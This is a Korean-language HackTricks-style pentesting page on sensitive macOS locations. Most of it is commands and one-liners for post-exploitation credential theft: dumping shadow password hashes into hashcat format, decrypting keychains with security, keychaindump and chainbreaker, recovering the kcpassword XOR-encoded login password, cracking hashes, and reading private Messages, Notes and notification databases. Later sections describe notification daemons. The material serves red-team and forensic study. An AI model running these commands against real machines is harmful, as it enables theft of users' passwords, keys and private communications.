# macOS 민감한 위치 및 흥미로운 데몬

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}

## 비밀번호

### 그림자 비밀번호

그림자 비밀번호는 **`/var/db/dslocal/nodes/Default/users/`**에 위치한 plist에 사용자의 구성과 함께 저장됩니다.\
다음의 원라이너를 사용하여 **사용자에 대한 모든 정보**(해시 정보 포함)를 덤프할 수 있습니다:

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**이 스크립트들**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) 또는 [**이 스크립트**](https://github.com/octomagon/davegrohl.git)는 해시를 **hashcat** **형식**으로 변환하는 데 사용할 수 있습니다.

모든 비서비스 계정의 자격 증명을 hashcat 형식 `-m 7100` (macOS PBKDF2-SHA512)으로 덤프하는 대체 원라이너: 

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### 키체인 덤프

보안 바이너리를 사용하여 **복호화된 비밀번호를 덤프**할 때, 여러 프롬프트가 사용자에게 이 작업을 허용할지를 묻습니다.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
이 댓글 [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)에 따르면, 이 도구들은 Big Sur에서 더 이상 작동하지 않는 것 같습니다.
{% endhint %}

### Keychaindump 개요

**keychaindump**라는 도구는 macOS 키체인에서 비밀번호를 추출하기 위해 개발되었지만, Big Sur와 같은 최신 macOS 버전에서는 제한이 있습니다. **keychaindump**를 사용하려면 공격자가 **root** 권한을 얻고 권한을 상승시켜야 합니다. 이 도구는 사용자 로그인 시 기본적으로 키체인이 잠금 해제된다는 사실을 이용하여, 애플리케이션이 사용자의 비밀번호를 반복적으로 요구하지 않고도 접근할 수 있도록 합니다. 그러나 사용자가 매번 사용 후 키체인을 잠그기로 선택하면 **keychaindump**는 효과가 없습니다.

**Keychaindump**는 **securityd**라는 특정 프로세스를 대상으로 작동하며, Apple은 이를 권한 부여 및 암호화 작업을 위한 데몬으로 설명합니다. 이는 키체인에 접근하는 데 필수적입니다. 추출 과정은 사용자의 로그인 비밀번호에서 파생된 **Master Key**를 식별하는 것을 포함합니다. 이 키는 키체인 파일을 읽는 데 필수적입니다. **Master Key**를 찾기 위해 **keychaindump**는 `vmmap` 명령을 사용하여 **securityd**의 메모리 힙을 스캔하며, `MALLOC_TINY`로 플래그가 지정된 영역 내에서 잠재적인 키를 찾습니다. 다음 명령은 이러한 메모리 위치를 검사하는 데 사용됩니다:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
잠재적인 마스터 키를 식별한 후, **keychaindump**는 특정 패턴(`0x0000000000000018`)을 나타내는 후보 마스터 키를 찾기 위해 힙을 검색합니다. 이 키를 활용하기 위해서는 **keychaindump**의 소스 코드에 설명된 대로 추가적인 단계인 디옵스큐레이션이 필요합니다. 이 분야에 집중하는 분석가는 키체인을 복호화하는 데 필요한 중요한 데이터가 **securityd** 프로세스의 메모리에 저장되어 있다는 점에 유의해야 합니다. **keychaindump**를 실행하는 예제 명령은:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker)는 포렌식적으로 안전한 방식으로 OSX 키체인에서 다음 유형의 정보를 추출하는 데 사용할 수 있습니다:

* 해시된 키체인 비밀번호, [hashcat](https://hashcat.net/hashcat/) 또는 [John the Ripper](https://www.openwall.com/john/)로 크랙하기에 적합
* 인터넷 비밀번호
* 일반 비밀번호
* 개인 키
* 공개 키
* X509 인증서
* 보안 노트
* 애플쉐어 비밀번호

키체인 잠금 해제 비밀번호, [volafox](https://github.com/n0fate/volafox) 또는 [volatility](https://github.com/volatilityfoundation/volatility)를 사용하여 얻은 마스터 키, 또는 SystemKey와 같은 잠금 해제 파일이 주어지면 Chainbreaker는 평문 비밀번호도 제공합니다.

키체인을 잠금 해제하는 이러한 방법 중 하나가 없으면 Chainbreaker는 사용 가능한 모든 다른 정보를 표시합니다.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey를 사용하여 키체인 키(비밀번호 포함) 덤프하기**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **키체인 키 덤프 (비밀번호 포함) 해시 크래킹**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **메모리 덤프를 사용하여 키체인 키(비밀번호 포함) 덤프하기**

[이 단계를 따르세요](../#dumping-memory-with-osxpmem) **메모리 덤프**를 수행하기 위해
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **사용자 비밀번호를 사용하여 키체인 키 덤프(비밀번호 포함)**

사용자의 비밀번호를 알고 있다면 이를 사용하여 **사용자에게 속한 키체인을 덤프하고 복호화**할 수 있습니다.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword** 파일은 **사용자의 로그인 비밀번호**를 저장하는 파일이지만, 시스템 소유자가 **자동 로그인을 활성화**한 경우에만 해당됩니다. 따라서 사용자는 비밀번호를 입력하라는 요청 없이 자동으로 로그인됩니다(이는 그리 안전하지 않습니다).

비밀번호는 **`/etc/kcpassword`** 파일에 **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** 키와 XOR되어 저장됩니다. 사용자의 비밀번호가 키보다 길면 키가 재사용됩니다.\
이로 인해 비밀번호를 복구하기가 꽤 쉬워지며, 예를 들어 [**이 스크립트**](https://gist.github.com/opshope/32f65875d45215c3677d)를 사용할 수 있습니다.

## 데이터베이스의 흥미로운 정보

### 메시지
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 알림

`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`에서 알림 데이터를 찾을 수 있습니다.

대부분의 흥미로운 정보는 **blob**에 있을 것입니다. 따라서 해당 내용을 **추출**하고 **사람이 읽을 수 있는** 형식으로 **변환**하거나 **`strings`**를 사용할 필요가 있습니다. 접근하려면 다음과 같이 할 수 있습니다:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Notes

사용자의 **노트**는 `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`에서 찾을 수 있습니다.

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

## Preferences

macOS 앱의 환경설정은 **`$HOME/Library/Preferences`**에 위치하고, iOS에서는 `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`에 있습니다.&#x20;

macOS에서는 CLI 도구 **`defaults`**를 사용하여 **환경설정 파일을 수정**할 수 있습니다.

**`/usr/sbin/cfprefsd`**는 XPC 서비스 `com.apple.cfprefsd.daemon`과 `com.apple.cfprefsd.agent`를 주장하며, 환경설정을 수정하는 등의 작업을 수행하기 위해 호출될 수 있습니다.

## System Notifications

### Darwin Notifications

알림을 위한 주요 데몬은 **`/usr/sbin/notifyd`**입니다. 알림을 받기 위해서는 클라이언트가 `com.apple.system.notification_center` Mach 포트를 통해 등록해야 합니다(이를 확인하려면 `sudo lsmp -p <pid notifyd>`를 사용하세요). 이 데몬은 `/etc/notify.conf` 파일로 구성할 수 있습니다.

알림에 사용되는 이름은 고유한 역 DNS 표기법이며, 알림이 그 중 하나로 전송되면 이를 처리할 수 있다고 표시한 클라이언트가 수신하게 됩니다.

현재 상태를 덤프하고(모든 이름을 확인) notifyd 프로세스에 SIGUSR2 신호를 보내고 생성된 파일을 읽어 `/var/run/notifyd_<pid>.status`에서 확인할 수 있습니다:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**분산 알림 센터**의 주요 바이너리는 **`/usr/sbin/distnoted`**로, 알림을 보내는 또 다른 방법입니다. 이 센터는 일부 XPC 서비스를 노출하며 클라이언트를 확인하기 위한 몇 가지 검사를 수행합니다.

### Apple Push Notifications (APN)

이 경우, 애플리케이션은 **주제**에 등록할 수 있습니다. 클라이언트는 **`apsd`**를 통해 Apple의 서버에 연락하여 토큰을 생성합니다.\
그런 다음, 제공자는 또한 토큰을 생성하고 Apple의 서버에 연결하여 클라이언트에게 메시지를 보낼 수 있습니다. 이러한 메시지는 **`apsd`**에 의해 로컬에서 수신되며, 이는 알림을 기다리고 있는 애플리케이션에 전달됩니다.

환경 설정은 `/Library/Preferences/com.apple.apsd.plist`에 위치해 있습니다.

macOS에는 `/Library/Application\ Support/ApplePushService/aps.db`에, iOS에는 `/var/mobile/Library/ApplePushService`에 메시지의 로컬 데이터베이스가 있습니다. 이 데이터베이스는 `incoming_messages`, `outgoing_messages` 및 `channel`의 3개 테이블을 가지고 있습니다.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
다음과 같은 방법으로 데몬 및 연결에 대한 정보를 얻는 것도 가능합니다:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## 사용자 알림

사용자가 화면에서 봐야 하는 알림입니다:

* **`CFUserNotification`**: 이 API는 메시지를 포함한 팝업을 화면에 표시하는 방법을 제공합니다.
* **게시판**: iOS에서 사라지는 배너를 표시하며, 알림 센터에 저장됩니다.
* **`NSUserNotificationCenter`**: MacOS의 iOS 게시판입니다. 알림이 저장된 데이터베이스는 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`에 위치합니다.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
